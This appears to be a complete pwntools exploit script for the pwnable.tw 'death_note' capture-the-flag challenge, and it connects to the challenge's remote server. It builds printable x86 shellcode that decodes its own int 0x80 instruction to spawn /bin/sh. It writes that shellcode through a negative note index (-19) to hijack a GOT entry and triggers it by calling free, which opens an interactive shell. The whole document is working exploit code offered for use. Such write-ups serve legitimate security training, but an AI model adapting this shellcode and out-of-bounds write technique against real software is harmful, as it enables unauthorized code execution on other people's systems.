#coding=utf8
from pwn import *
context.log_level = 'debug'
#p = process('./death_note')

p = remote('chall.pwnable.tw', 10201)


def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()

def add(idx,content):
	p.sendline('1')
	p.sendlineafter('Index :', str(idx))
	p.sendlineafter('Name :', content)

def free(idx):
	p.sendline('3')
	p.sendlineafter('Index :', str(idx))

shellcode = asm('''
/* execve('/bin///sh',0,0)*/

push 0x68
push 0x732f2f2f
push 0x6e69622f

push esp
pop ebx /*set ebx to '/bin///sh'*/


push edx
dec edx
dec edx /*set dl to 0xfe*/


xor [eax+32],dl /*decode int 0x80*/
xor [eax+33],dl /*decode int 0x80*/

inc edx
inc edx /*recover edx to 0*/

push edx
pop ecx /*set ecx to 0*/

push 0x40
pop eax
xor al,0x4b /*set eax to 0xb*/

/*int 0x80*/
''')+'\x33\x7e'

add(-19, shellcode)
#dbg('b*0x08048490\nc')
free(-19)

p.interactive()